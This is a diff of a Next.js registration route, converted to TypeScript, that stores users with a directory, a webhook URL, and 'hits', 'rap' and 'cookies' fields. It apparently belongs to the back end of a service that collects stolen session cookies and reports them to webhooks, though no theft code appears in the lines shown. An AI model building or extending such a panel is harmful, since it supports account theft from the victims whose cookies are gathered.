@@ -1,11 +1,13 @@
 import { NextResponse } from 'next/server'
 import { generateToken, encrypt } from '@/lib/crypto'
 import { sendWebhook } from '@/lib/webhook'
+import { users } from '@/lib/store'
 
-const users = new Map()
-
-export async function POST(req) {
-  const { directory, webhookUrl } = await req.json()
+export async function POST(req: Request) {
+  const { directory, webhookUrl } = await req.json() as {
+    directory?: string
+    webhookUrl?: string
+  }
 
   if (!directory || !webhookUrl) {
     return NextResponse.json({ success: false, message: 'Directory and webhook required' }, { status: 400 })
@@ -31,7 +33,7 @@ export async function POST(req) {
     displayName: 'AutoHar User',
     hits: 0,
     rap: 0,
-    cookies: [],
+    cookies: [] as any[],
     createdAt: new Date().toISOString()
   }
 
@@ -59,5 +61,3 @@ export async function POST(req) {
   res.cookies.set('rc_session', session, { httpOnly: true, maxAge: 60 * 60 * 24 * 30, path: '/' })
   return res
 }
-
-export { users }
